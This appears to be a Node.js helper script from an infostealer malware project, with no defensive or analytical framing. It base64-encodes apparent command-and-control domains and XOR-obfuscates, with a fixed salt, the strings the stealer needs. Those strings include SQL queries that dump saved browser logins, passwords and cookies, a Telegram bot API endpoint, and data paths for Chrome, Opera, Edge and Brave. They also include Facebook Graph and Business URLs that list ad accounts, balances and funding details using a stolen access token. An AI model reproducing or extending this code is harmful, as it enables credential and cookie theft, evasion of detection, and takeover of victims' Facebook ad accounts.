const bbbse = require('js-base64');

// bkbot0
// let t= bbbse.encode(JSON.stringify(['thisdomainn.com']));
// console.log(t);
// console.log('-------');



// bkbot0
let t= bbbse.encode(JSON.stringify(['https://hahalearnme.com']));
console.log(t);
console.log('-------');



// let t2= bbbse.encode('https://cloudimagesv.top');
//aHR0cHM6Ly9jbG91ZGltYWdlc3YudG9wLw==
//bot0
// console.log(t2);

let cipher = salt => {
    let textToChars = text => text.split('').map(c => c.charCodeAt(0));
    let byteHex = n => ('0' + Number(n).toString(16)).substr(-2);
    let applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);

    return text => text.split('')
        .map(textToChars)
        .map(applySaltToChar)
        .map(byteHex)
        .join('');
};
let decipher = salt => {
    let textToChars = text => text.split('').map(c => c.charCodeAt(0));
    let applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
    return encoded => encoded.match(/.{1,2}/g)
        .map(hex => parseInt(hex, 16))
        .map(applySaltToChar)
        .map(charCode => String.fromCharCode(charCode))
        .join('');
};

let De = decipher('haha123444')
let Encipher = cipher('haha123444');
console.log('haha')
// let tt3=(Encipher('SELECT action_url, username_value, password_value FROM logins'));
// let tt3=(Encipher('SELECT * FROM cookies'));
// let tt3=(Encipher('https://api.telegram.org/bot'));
// let tt3=(Encipher(JSON.stringify( {
//     name:"Chrome",
//     productName:'Google Chrome',
//     pa: "\\AppData\\Local\\Google\\Chrome\\User Data",
//     local: "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
//     cookie: "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
//     login: "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
// })));
// let tt3=(Encipher(JSON.stringify({
//     name:"Opera",
//     productName:'Opera Browser',
//     pa:"\\AppData\\Roaming\\Opera Software\\Opera GX Stable",
//     local:"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State",
//     cookie:"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Cookies",
//     login: "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"
// })));
// let tt3=(Encipher(JSON.stringify({
//     name:"Opera",
//     productName:'Opera Browser',
//     pa: "\\AppData\\Roaming\\Opera Software\\Opera Stable",
//     local: "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State",
//     cookie: "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies",
//     login: "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
// }
// )));
// let tt3=(Encipher(JSON.stringify( {
//     name:"Edge",
//     productName:'Microsoft Edge',
//     pa: "\\AppData\\Local\\Microsoft\\Edge\\User Data",
//     local: "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
//     cookie: "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies",
//     login: "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
// })));
// let tt3=(Encipher(JSON.stringify({
//     name:"Brave",
//     productName:'Brave Browser',
//     pa: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
//     local: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
//     cookie: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
//     login: "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
// })));
// let tt3=(Encipher(('https://www.facebook.com/ads/adbuilder')));
// let tt3=(Encipher('https://graph.facebook.com/v14.0/me/businesses?fields=name,permitted_roles,is_disabled_for_integrity_reasons,business_invoices,created_time,verification_status,owned_ad_accounts{sufunding_id,adtrust_dsl,balance,is_prepay_account,currency,account_id,account_status,partner,name,funding_source_details,amount_spent,insights.date_preset(maximum){spend},adspaymentcycle{threshold_amount}}&limit=200&access_token='));
// let tt3=(Encipher('https://business.facebook.com/business/adaccount/limits/?business_id='));
let tt3=(Encipher('https://graph.facebook.com'));
// let tt3=(Encipher('https://business.facebook.com/business/adaccount/limits/?business_id='));

console.log(tt3);
console.log(De(tt3))
let t2= bbbse.encode('https://hahalearnme.com');
//aHR0cHM6Ly9jbG91ZGltYWdlc3YudG9wLw==
//bot0
// console.log(t2);
